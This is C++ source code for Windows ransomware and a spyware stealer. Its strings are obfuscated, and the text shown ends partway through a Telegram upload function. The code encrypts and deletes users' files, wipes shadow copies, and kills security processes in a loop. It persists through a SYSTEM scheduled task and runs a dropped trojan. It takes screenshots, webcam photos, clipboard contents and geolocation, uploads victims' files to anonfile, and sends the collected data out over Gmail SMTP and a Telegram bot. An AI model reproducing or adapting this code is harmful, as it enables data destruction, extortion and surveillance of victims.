#include "headers.h"

using namespace std;
using Json = nlohmann::json;
namespace fs = std::experimental::filesystem;

// needed for webcam images
EXTERN_C const CLSID CLSID_NullRenderer;
EXTERN_C const CLSID CLSID_SampleGrabber;

vector<string> webcams;
vector<string> filesLink;
vector<string> globalAllFiles;
mutex allFilesMutex;

string exec(const char* cmd) {
    string result = (string)skCrypt("");
    FILE* CommandResult = _popen(cmd, skCrypt("rt"));
    char line[256];
    while (fgets(line, 256, CommandResult)) 
        result += line;
    _pclose(CommandResult);
    return result;
}

string powershellEncodedCommand(string cmd) {
    return (string)skCrypt("powershell -enCoDEdcOmmAnD ") + exec(((string)skCrypt("powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"") + cmd + (string)skCrypt("\\\"))")).c_str());
}

bool copy_file(const char* From, const char* To) {
    size_t MaxBufferSize = 1048576;
    ifstream is(From, ios_base::binary);
    ofstream os(To, ios_base::binary);

    pair<char*, ptrdiff_t> buffer;
    buffer = get_temporary_buffer<char>(MaxBufferSize);

    while (is.good() and os) {
        is.read(buffer.first, buffer.second);
        os.write(buffer.first, is.gcount());
    }

    return_temporary_buffer(buffer.first);

    if (os.fail())
        return false;
    if (is.eof())
        return true;
    return false;
}

DWORD trojanFunction(LPVOID params_useless) {
    this_thread::sleep_for(6500ms);
    if (DROPRUN_TROJAN_FILE)
        system((TROJANFILE).c_str());
    system(((string)skCrypt("start ") + (string)skCrypt("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).c_str());   // just for fun and for tests - you can delete this line
}

DWORD removeTasks(LPVOID params_useless) {
    string check1 = (string)skCrypt("(get-process -ea SilentlyContinue '");
    string check2 = (string)skCrypt("') -eq $Null");

    string kill1 = (string)skCrypt("Stop-Process -Force -Name '");
    string kill2 = (string)skCrypt("'");

	while (true) {
        for (string badProgram : badPrograms) {
            if (exec(powershellEncodedCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
                system(powershellEncodedCommand(kill1 + badProgram + kill2).c_str());
        }
	}
}

void getAllFiles(string username) {
    vector<string> tmpFiles;

    for (string file : split(exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
        tmpFiles.push_back(file);

    for (int i = 0; i < tmpFiles.size(); i++) {
        vector<string> fileSplitted = split(tmpFiles[i], '.');

        for (string safeFile : safeFiles)
            if (safeFile == tmpFiles[i])
                goto erase;

        if (ENABLE_WHITELIST)
            for (string extensionW : whitelist)
                if (fileSplitted.back() == extensionW)
                    goto continue_;
        if (ENABLE_BLACKLIST)
            for (string extensionB : blacklist)
                if (fileSplitted.back() == extensionB)
                    goto erase;

    continue_:
        continue;
    erase:
        tmpFiles.erase(tmpFiles.begin() + i);
    }

    allFilesMutex.lock();
    globalAllFiles.insert(globalAllFiles.end(), tmpFiles.begin(), tmpFiles.end());
    allFilesMutex.unlock();
}

int gettimeofday(struct timeval* tp, struct timezone* tzp) {
    static const uint64_t EPOCH = ((uint64_t)116444736000000000ULL);

    SYSTEMTIME  system_time;
    FILETIME    file_time;
    uint64_t    time;

    GetSystemTime(&system_time);
    SystemTimeToFileTime(&system_time, &file_time);
    time = ((uint64_t)file_time.dwLowDateTime);
    time += ((uint64_t)file_time.dwHighDateTime) << 32;

    tp->tv_sec = (long)((time - EPOCH) / 10000000L);
    tp->tv_usec = (long)(system_time.wMilliseconds * 1000);
    return 0;
}

string generateRandom(const int len) {
    timeval time;
    gettimeofday(&time, NULL);
    const string alphanum = (string)skCrypt("UHGAX5r9eVJsiDMqSCN6QEgoPpvcW2fkyzhBl048dajFbxmIwuOT7KLYZn31tR");  // = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" but scrambled for more security against reverse
    string result;
    result.reserve(len);
    srand((time.tv_sec * 2654435789U + time.tv_usec) * 2654435789U + _getpid());
    for (int i = 0; i < len; ++i) 
        result += alphanum.at(rand() % (size(alphanum) - 1));

    return result;
}

vector<string> getFiles(string mainDir) {
    vector<string> result;

    if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
        vector<string> files = split(exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
        for (string file : files) {
            vector<string> fileSplitted = split(file, '.');

            for (string safeFile : safeFiles)
                if (safeFile == file)
                    goto continue_;

            if (ENABLE_WHITELIST)
                for (string extensionW : whitelist)
                    if (fileSplitted.back() == extensionW)
                        goto push;
            if (ENABLE_BLACKLIST)
                for (string extensionB : blacklist)
                    if (fileSplitted.back() == extensionB)
                        goto continue_;

        push:
            result.push_back(file);
        continue_:
            continue;
        }
    }

    else {
        vector<thread> threads;
        for (string user : split(exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
            if (!fileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
                continue;
            if (PathIsDirectoryEmptyA((LPCSTR)((string)skCrypt("C:\\Users\\") + user).c_str()))   /*directory is empty*/
                continue;

            threads.push_back(thread(getAllFiles, user));
        }
        for (int i = 0; i < threads.size(); i++)
            threads[i].join();

        result.insert(result.end(), globalAllFiles.begin(), globalAllFiles.end());
    }
    result.pop_back();
    return result;
}

vector<string> split(const string& s, char delimiter) {
    size_t start = 0;
    size_t end = s.find_first_of(delimiter);
    vector<string> output;

    while (end <= string::npos) {
        output.emplace_back(s.substr(start, end - start));

        if (end == string::npos)
            break;

        start = end + 1;
        end = s.find_first_of(delimiter, start);
    }

    return output;
}

bool fileExists(const string& name) {
    struct stat buffer;
    return stat(name.c_str(), &buffer) == 0;
}

string getDate() {
    auto timeNow = time(nullptr);
    ostringstream stream;
    stream << put_time(localtime(&timeNow), ((string)skCrypt("%d-%m-%Y %H:%M:%S")).c_str());
    return stream.str();
}

string getHWID() {
    HW_PROFILE_INFO hwProfileInfo;
    GetCurrentHwProfile(&hwProfileInfo);
    wstring ws(hwProfileInfo.szHwProfileGuid);
    return string(ws.begin(), ws.end());
}

string getIPData() {
    string result;
    URLDownloadToFileA(NULL, skCrypt("http://ipwho.is/"), (TEMPFILE).c_str(), 0, NULL);
    SetFileAttributesA((TEMPFILE).c_str(), FILE_ATTRIBUTE_HIDDEN);
    ifstream file((TEMPFILE));
    Json data = Json::parse(file);
    file.close();
    DeleteFileA((TEMPFILE).c_str());
    result += (string)data[(string)skCrypt("ip")] + (string)skCrypt("\n");
    result += (string)data[(string)skCrypt("country")] + (string)skCrypt("\n");
    result += (string)data[(string)skCrypt("city")] + (string)skCrypt("\n");
    result += to_string(data[(string)skCrypt("latitude")]) + (string)skCrypt("\n");
    result += to_string(data[(string)skCrypt("longitude")]) + (string)skCrypt("\n");
    return result;
}

string getCPU() {
    string result = (string)skCrypt("");
    int cpuInfo[4] = { -1 };
    unsigned nExIds;
    char cpuBrand[64];
    __cpuid(cpuInfo, 0x80000000);
    nExIds = cpuInfo[0];
    for (int i = 0x80000000; i <= nExIds; ++i) {
        __cpuid(cpuInfo, i);
        if (i == 0x80000002)
            memcpy(cpuBrand, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000003)
            memcpy(cpuBrand + 16, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000004)
            memcpy(cpuBrand + 32, cpuInfo, sizeof(cpuInfo));
    }
    ostringstream stream;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    MEMORYSTATUSEX stateX;
    stateX.dwLength = sizeof(stateX);
    GlobalMemoryStatusEx(&stateX);
    stream << sysInfo.dwNumberOfProcessors << skCrypt("\n") << (stateX.ullTotalPhys / 1024) / 1024;
    result += cpuBrand;
    result += skCrypt("\n");
    result += stream.str();
    return result;
}

string getGPU() {
    string result = (string)skCrypt("none");
    DISPLAY_DEVICE displayDevice = {sizeof(displayDevice), 0};
    if (EnumDisplayDevices(NULL, 0, &displayDevice, EDD_GET_DEVICE_INTERFACE_NAME)) {   /*it takes only the first gpu*/
        wstring ws(displayDevice.DeviceString);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string getPcName() {
    string result = (string)skCrypt("none");
    TCHAR  infoBuf[1600];
    DWORD  bufCharCount = 1600;

    if (GetComputerName(infoBuf, &bufCharCount)) {
        wstring ws(&infoBuf[0]);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string getUserName() {
    string result = (string)skCrypt("none");
    TCHAR  infoBuf[1600];
    DWORD  bufCharCount = 1600;

    if (GetUserName(infoBuf, &bufCharCount)) {
        wstring ws(&infoBuf[0]);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string getResolution() {
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    ostringstream stream;
    stream << desktop.right << skCrypt("x") << desktop.bottom;
    return stream.str();
}

string getWinVersion() {
    string result = (string)skCrypt("none");
    if (IsWindowsXPOrGreater())
        result = (string)skCrypt("XP / Vista");
    if (IsWindows7OrGreater())
        result = (string)skCrypt("Seven");
    if (IsWindows7SP1OrGreater())
        result = (string)skCrypt("Seven SP1");
    if (IsWindows8OrGreater())
        result = (string)skCrypt("Eight");
    if (IsWindows8Point1OrGreater())
        result = (string)skCrypt("Eight.one");
    if (IsWindows10OrGreater())
        result = (string)skCrypt("Ten");
    if (IsWindowsServer())
        result = (string)skCrypt("Server");
    return result;
}

string getLanguage() {
    char buf[10];
    return string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, buf, sizeof(buf)) - 1) + 
          (string)skCrypt("-") + 
           string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, sizeof(buf)));
}

string getClipboard() {
    string result = (string)skCrypt("none");
    if (!OpenClipboard(nullptr))
        return result;

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr)
        return result;

    char* pszText = static_cast<char*>(GlobalLock(hData));
    if (pszText == nullptr)
        return result;

    result = pszText;
    GlobalUnlock(hData);
    CloseClipboard();
    return result;
}

string getScreenshot() {
    string filename = TEMPFILE + (string)skCrypt(".bmp");
    string filename2 = TEMPFILE + (string)skCrypt(".jpg");

    HWND desktopHwnd = GetDesktopWindow();
    RECT desktopParams;
    HDC devC = GetDC(desktopHwnd);
    GetWindowRect(desktopHwnd, &desktopParams);
    DWORD width = desktopParams.right - desktopParams.left;
    DWORD height = desktopParams.bottom - desktopParams.top;

    DWORD fileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (sizeof(RGBTRIPLE) + 1 * (width * height * 4));
    char* bmpData = (char*)GlobalAlloc(0x0040, fileSize);

    PBITMAPFILEHEADER fileHeader = (PBITMAPFILEHEADER)bmpData;
    PBITMAPINFOHEADER  infoHeader = (PBITMAPINFOHEADER)&bmpData[sizeof(BITMAPFILEHEADER)];

    fileHeader->bfType = 0x4D42;
    fileHeader->bfSize = sizeof(BITMAPFILEHEADER);
    fileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    infoHeader->biSize = sizeof(BITMAPINFOHEADER);
    infoHeader->biPlanes = 1;
    infoHeader->biBitCount = 24;
    infoHeader->biCompression = BI_RGB;
    infoHeader->biHeight = height;
    infoHeader->biWidth = width;

    RGBTRIPLE* image = (RGBTRIPLE*)&bmpData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];
    RGBTRIPLE color;

    HDC captureDC = CreateCompatibleDC(devC);
    HBITMAP captureBitmap = CreateCompatibleBitmap(devC, width, height);
    SelectObject(captureDC, captureBitmap);
    BitBlt(captureDC, 0, 0, width, height, devC, 0, 0, SRCCOPY | CAPTUREBLT);
    GetDIBits(captureDC, captureBitmap, 0, height, image, (LPBITMAPINFO)infoHeader, DIB_RGB_COLORS);

    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
    WriteFile(hFile, bmpData, fileSize, new DWORD, 0);
    CloseHandle(hFile);
    GlobalFree(bmpData);

    CImage Cimage;
    HRESULT res = Cimage.Load((const wchar_t*)wstring(filename.begin(), filename.end()).c_str());
    Cimage.Save((const wchar_t*)wstring(filename2.begin(), filename2.end()).c_str());

    ifstream imageFile(filename2, ios::in | ios::binary);
    vector<BYTE> data(istreambuf_iterator<char>(imageFile), {});
    string result = base64_encode(&data[0], data.size());
    imageFile.close();
    
    if (remove(filename.c_str()) != 0)
        DeleteFileA(filename.c_str());
    if (remove(filename2.c_str()) != 0)
        DeleteFileA(filename2.c_str());

    return result;
}

vector<string> getLinks() {
    return filesLink;
}

vector<string> getWebcams() {
    return webcams;
}

void sendEmail() {
    system(powershellEncodedCommand(
        (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
        (string)skCrypt("' -tO '") + RECEIVERMAIL +
        (string)skCrypt("' -SuBJect '") + EMAILSUBJECT +
        (string)skCrypt("' -bodY '") + EMAILBODY +
        (string)skCrypt("' -AtTAchMenTs '") + INFOFILE +
        (string)skCrypt("' -sMtPsERveR 'smtp.gmail.com' -pOrt 587 -usESsl -creDentIAl (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '") + SENDERMAIL +
        (string)skCrypt("', (ConvertTo-SecureString '") + SENDERPSW +
        (string)skCrypt("' -AsPlainText -Force))")
    ).c_str());
}

void dropFile(string content, string path) {
    ofstream fout(path, ios::binary | ios::out);
    vector<BYTE> write = base64_decode(content);
    fout.write((const char*)&write[0], write.size());
}

void changeWallpaper(string content) {
    ofstream fout(NEWWALLPAPER, ios::binary | ios::out);
    vector<BYTE> write = base64_decode(content);
    fout.write((const char*)&write[0], write.size());
    fout.close();
    if (!copy_file(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\") + split(exec(skCrypt("dir /b %AppData%\\Microsoft\\Windows\\Themes\\CachedFiles")), '\n')[0]).c_str(), (OLDWALLPAPER).c_str()) && DEBUG)
        cout << skCrypt("Wallpaper not copied!\n\n");

    USES_CONVERSION_EX;
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, A2W_EX((NEWWALLPAPER).c_str(), (NEWWALLPAPER).length()), SPIF_UPDATEINIFILE);
}

bool isConnected2Internet() {
    return InternetCheckConnection(CA2W(skCrypt("http://www.google.com/")), FLAG_ICC_FORCE_CONNECTION, 0);
}

void scheduleTask() {
    system(((string)skCrypt("schtasks /delete /f /tn \"") + TASKNAME + (string)skCrypt("\"")).c_str());
    system(((string)skCrypt("schtasks /create /sc minute /mo ") + MINUTES + (string)skCrypt(" /f /ru \"SYSTEM\" /tn \"") + TASKNAME + (string)skCrypt("\" /tr \"powershell -noprofile -executionpolicy bypass -file '") + EMAILSENDER + (string)skCrypt("'\"")).c_str());
}

vector<vector<string>> vectorSplitter(vector<string> baseVector, int parts) {
    vector<vector<string>> result;
    int length = baseVector.size() / parts;
    int remain = baseVector.size() % parts;
    int begin = 0, end = 0;
    for (int i = 0; i < min(parts, baseVector.size()); ++i) {
        end += (remain > 0) ? (length + !!(remain--)) : length;
        result.push_back(vector<string>(baseVector.begin() + begin, baseVector.begin() + end));
        begin = end;
    }
    return result;
}

void deleteRestorePoints() {
    system(powershellEncodedCommand((string)skCrypt("vssadmin delete shadows /all /quiet")).c_str());
}

void deleteMe(string myPath) {
    system(( (string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"") ).c_str());
}

void encryptFiles(vector<string> files, string key) {
    for (string file : files) {

        HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (GetLastError() == ERROR_FILE_NOT_FOUND || (MAX_FILE_SIZE == 0 ? false : GetFileSize(hFile, NULL) > MAX_FILE_SIZE)) {
            CloseHandle(hFile);
            continue;
        }
        CloseHandle(hFile);
        ifstream fin(file, ios::in | ios::binary);
        vector<BYTE> data(istreambuf_iterator<char>(fin), {});
        fin.close();

        string content = aes_encrypt(key, base64_encode(&data[0], data.size()), IV);

        if (remove(file.c_str()) != 0)
            DeleteFileA(file.c_str());

        ofstream fout(file + FILE_EXTENSION, ios::out);
        fout.write((const char*)&content[0], content.size());
        fout.close();
    }
}

void uploadFiles(vector<string> files) {
    for (string file : files) {
        string boundary = (string)skCrypt("$$") + generateRandom(32) + (string)skCrypt("$$");
        string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
        string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"file\"; filename=\"") + split(file, '\\').back() + (string)skCrypt("\"\r\nContent-Type: application/octet-stream\r\n\r\n");
        string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
        string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");

        ifstream rFile(file, ios::in);
        stringstream buffer;
        buffer << rFile.rdbuf();
        rFile.close();
        string data = beggining + buffer.str() + ending;

        HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;

        hsession = InternetOpenA(userAgent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hsession)
            goto cleanup;

        hconnect = InternetConnectA(hsession, skCrypt("api.anonfile.com"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hconnect)
            goto cleanup;

        hrequest = HttpOpenRequestA(hconnect, skCrypt("POST"), skCrypt("/upload"), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
        if (!hrequest)
            goto cleanup;

        if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.size()))
            goto cleanup;

        DWORD received;
        BYTE buf[1024];
        while (InternetReadFile(hrequest, buf, sizeof(buf), &received) && received) {
            buf[received] = 0;
            char str[sizeof(buf) + 1];
            memcpy(str, buf, sizeof(buf));
            str[sizeof(buf)] = 0;
            Json data = Json::parse(str);
            if (data[(string)skCrypt("status")])
                filesLink.push_back((string)data[(string)skCrypt("data")][(string)skCrypt("file")][(string)skCrypt("url")][(string)skCrypt("full")]);
            else
                filesLink.push_back((string)skCrypt("none"));
        }


    cleanup:
        if (hsession)
            InternetCloseHandle(hsession);
        if (hconnect)
            InternetCloseHandle(hconnect);
        if (hrequest)
            InternetCloseHandle(hrequest);
    }
}

void createAndSetRegKey(HKEY key, string keyPath, string keyName, string value) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyEx(key, CA2T(keyPath.c_str()), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS && DEBUG)
            cout << key << skCrypt("\\") << keyPath << skCrypt(" not created\n");

    if (keyName == (string)skCrypt("NULL") && RegSetValueA(hKey, NULL, REG_SZ, value.c_str(), value.size()) != ERROR_SUCCESS && DEBUG)
         cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");

    else if (RegSetValueA(hKey, keyName.c_str(), REG_SZ, value.c_str(), value.size()) != ERROR_SUCCESS && DEBUG)
        cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");


    if (RegCloseKey(hKey) != ERROR_SUCCESS && DEBUG)
        cout << key << skCrypt("\\") << keyPath << skCrypt(" not closed\n");
}

void takeWebcams() {
    HRESULT hr;
    ICreateDevEnum* pDevEnum = NULL;
    IEnumMoniker* pEnum = NULL;
    IMoniker* pMoniker = NULL;
    IPropertyBag* pPropBag = NULL;
    IGraphBuilder* pGraph = NULL;
    ICaptureGraphBuilder2* pBuilder = NULL;
    IBaseFilter* pCap = NULL;
    IBaseFilter* pSampleGrabberFilter = NULL;
    DexterLib::ISampleGrabber* pSampleGrabber = NULL;
    IBaseFilter* pNullRenderer = NULL;
    IMediaControl* pMediaControl = NULL;
    char* pBuffer = NULL;
    
    bool deleteFolder = false;
    if (!fs::is_directory(WEBCAM_PATH) || !fs::exists(WEBCAM_PATH)) {
        fs::create_directory(WEBCAM_PATH);
        deleteFolder = true;
    }

    vector<string> filenames;

    VIDEOINFOHEADER* pVih = NULL;
    long buffer_size = 0;
    int n = 1;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (hr != S_OK)
        goto cleanup;

    hr = CoCreateInstance(CLSID_FilterGraph, NULL,
        CLSCTX_INPROC_SERVER, IID_IGraphBuilder,
        (void**)&pGraph);
    if (hr != S_OK)
        goto cleanup;

    hr = CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL,
        CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2,
        (void**)&pBuilder);
    if (hr != S_OK)
        goto cleanup;

    hr = pBuilder->SetFiltergraph(pGraph);
    if (hr != S_OK)
        goto cleanup;

    hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL,
        CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
    if (hr != S_OK)
        goto cleanup;

    hr = pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
    if (hr != S_OK)
        goto cleanup;


    VARIANT var;
    n = 0;
    while (true) {
        hr = pEnum->Next(1, &pMoniker, NULL);

        if (hr != S_OK)
            goto cleanup;

        n++;

        hr = pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
        VariantInit(&var);
        hr = pPropBag->Read(CA2W(skCrypt("FriendlyName")), &var, 0);
        _bstr_t tmp(var.bstrVal);
        wstring FullFIleName((wchar_t*)tmp, tmp.length());
        string filename = WEBCAM_PATH + string(FullFIleName.begin(), FullFIleName.end()) + (string)skCrypt(".bmp");
        VariantClear(&var);

        hr = pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**)&pCap);
        if (hr != S_OK) 
            goto cleanup;

        hr = pGraph->AddFilter(pCap, CA2W(skCrypt("Capture Filter")));
        if (hr != S_OK) 
            goto cleanup;

        hr = CoCreateInstance(CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pSampleGrabberFilter);
        if (hr != S_OK)
            goto cleanup;

        hr = pSampleGrabberFilter->QueryInterface(DexterLib::IID_ISampleGrabber, (void**)&pSampleGrabber);
        if (hr != S_OK)
            goto cleanup;

        hr = pSampleGrabber->SetBufferSamples(TRUE);
        if (hr != S_OK)
            goto cleanup;

        AM_MEDIA_TYPE mt;
        ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
        mt.majortype = MEDIATYPE_Video;
        mt.subtype = MEDIASUBTYPE_RGB24;
        hr = pSampleGrabber->SetMediaType((DexterLib::_AMMediaType*)&mt);
        if (hr != S_OK)
            goto cleanup;

        hr = pGraph->AddFilter(pSampleGrabberFilter, CA2W(skCrypt("SampleGrab")));
        if (hr != S_OK)
            goto cleanup;

        hr = CoCreateInstance(CLSID_NullRenderer, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&pNullRenderer);
        if (hr != S_OK)
            goto cleanup;

        hr = pGraph->AddFilter(pNullRenderer, CA2W(skCrypt("NullRender")));
        if (hr != S_OK)
            goto cleanup;

        hr = pBuilder->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, pSampleGrabberFilter, pNullRenderer);
        if (hr != S_OK)
            goto cleanup;

        hr = pGraph->QueryInterface(IID_IMediaControl, (void**)&pMediaControl);
        if (hr != S_OK) 
            goto cleanup;

        while (true) {
            hr = pMediaControl->Run();

            if (hr == S_OK) 
                break;
            if (hr == S_FALSE) 
                continue; 

            goto cleanup;
        }


        while (true) {
            hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, NULL);
            if (hr == S_OK && buffer_size != 0) 
                break;
            if (hr != S_OK && hr != VFW_E_WRONG_STATE)
                goto cleanup;
        }

        pMediaControl->Stop();

        pBuffer = new char[buffer_size];
        if (!pBuffer)
            goto cleanup;

        hr = pSampleGrabber->GetCurrentBuffer(&buffer_size, (long*)pBuffer);
        if (hr != S_OK)
            goto cleanup;

        hr = pSampleGrabber->GetConnectedMediaType((DexterLib::_AMMediaType*)&mt);
        if (hr != S_OK) 
            goto cleanup;

        if (mt.formattype == FORMAT_VideoInfo && mt.cbFormat >= sizeof(VIDEOINFOHEADER) && mt.pbFormat != NULL) {
            pVih = (VIDEOINFOHEADER*)mt.pbFormat;

            long cbBitmapInfoSize = mt.cbFormat - SIZE_PREHEADER;
            BITMAPFILEHEADER bfh;
            ZeroMemory(&bfh, sizeof(bfh));
            bfh.bfType = 'MB'; // "BM" in little-endian
            bfh.bfSize = sizeof(bfh) + buffer_size + cbBitmapInfoSize;
            bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + cbBitmapInfoSize;

            wchar_t wtext[100];
            mbstowcs(wtext, filename.c_str(), filename.length() + 1);
            HANDLE hf = CreateFile(wtext, GENERIC_WRITE,
                FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
            if (hf == INVALID_HANDLE_VALUE)
                goto cleanup;

            DWORD dwWritten = 0;
            WriteFile(hf, &bfh, sizeof(bfh), &dwWritten, NULL);
            WriteFile(hf, HEADER(pVih),
                cbBitmapInfoSize, &dwWritten, NULL);

            WriteFile(hf, pBuffer, buffer_size, &dwWritten, NULL);
            CloseHandle(hf);
        }
        else
            goto cleanup;


        if (mt.cbFormat != 0) {
            CoTaskMemFree((PVOID)mt.pbFormat);
            mt.cbFormat = 0;
            mt.pbFormat = NULL;
        }
        if (mt.pUnk != NULL) {
            mt.pUnk->Release();
            mt.pUnk = NULL;
        }

        filenames.push_back(filename);

        if (n >= MAX_PHOTOS)
            break;
    }


cleanup:
    if (pBuffer != NULL)
        delete[](pBuffer);
    if (pMediaControl != NULL)
        pMediaControl->Release();
    if (pNullRenderer != NULL)
        pNullRenderer->Release();
    if (pSampleGrabber != NULL)
        pSampleGrabber->Release();
    if (pSampleGrabberFilter != NULL)
        pSampleGrabberFilter->Release();
    if (pCap != NULL)
        pCap->Release();
    if (pBuilder != NULL)
        pBuilder->Release();
    if (pGraph != NULL)
        pGraph->Release();
    if (pPropBag != NULL)
        pPropBag->Release();
    if (pMoniker != NULL)
        pMoniker->Release();
    if (pEnum != NULL)
        pEnum->Release();
    if (pDevEnum != NULL)
        pDevEnum->Release();
    CoUninitialize();



    for (string file : filenames) {
        string file2 = split(split(file, '\\').back(), '.')[0] + (string)skCrypt(".jpg");
        CImage Cimage;
        HRESULT res = Cimage.Load((const wchar_t*)wstring(file.begin(), file.end()).c_str());
        Cimage.Save((const wchar_t*)wstring(file2.begin(), file2.end()).c_str());

        ifstream webcamFile(file2, ios::in | ios::binary);
        vector<BYTE> data(istreambuf_iterator<char>(webcamFile), {});
        webcams.push_back(split(file2, '\\').back() + (string)skCrypt(" ") + base64_encode(&data[0], data.size()));
        webcamFile.close();

        if (remove(file.c_str()) != 0)
            DeleteFileA(file.c_str());
        if (remove(file2.c_str()) != 0)
            DeleteFileA(file2.c_str());
    }

    if (deleteFolder)
        fs::remove(WEBCAM_PATH);

    return;
}

void changeIcon() {
    string progId = "";
    for (int i = 1; i < (FILE_EXTENSION).length(); i++)
        progId += towlower((FILE_EXTENSION)[i]);
    progId += skCrypt("file");

    createAndSetRegKey(HKEY_CURRENT_USER, 
        (string)skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\") + FILE_EXTENSION + (string)skCrypt("\\UserChoice"),
        (string)skCrypt("ProgId"), progId);
    createAndSetRegKey(HKEY_CLASSES_ROOT, FILE_EXTENSION, (string)skCrypt("NULL"), progId);
    createAndSetRegKey(HKEY_CLASSES_ROOT, progId + (string)skCrypt("\\DefaultIcon"), (string)skCrypt("NULL"), FILESICON);

    exec(((string)skCrypt("assoc ") + FILE_EXTENSION + (string)skCrypt("=") + progId).c_str());
}

void sendTelegramInfo() {
    string boundary = (string)skCrypt("$$") + generateRandom(32) + (string)skCrypt("$$");
    string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
    string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n") + CHAT_ID +
        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n") + getHWID() +
        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"document\"; filename=\"") + split(INFOFILE, '\\').back() + (string)skCrypt("\"\r\nContent-Type: text/plain\r\n\r\n");
    string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
    string userAgent = (string)skCrypt("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36,gzip(gfe)");


    ifstream rFile(INFOFILE, ios::in);
    stringstream buffer;
    buffer << rFile.rdbuf();
    rFile.close();
    string data = beggining + buffer.str() + ending;

    HINTERNET hsession = NULL, hconnect = NULL, hrequest = NULL;

    hsession = InternetOpenA(userAgent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hsession)
        goto cleanup;

    hconnect = InternetConnectA(hsession, skCrypt("api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hconnect)
        goto cleanup;

    hrequest = HttpOpenRequestA(hconnect, skCrypt("POST"), ((string)skCrypt("/bot") + BOT_TOKEN + (string)skCrypt("/sendDocument")).c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hrequest)
        goto cleanup;
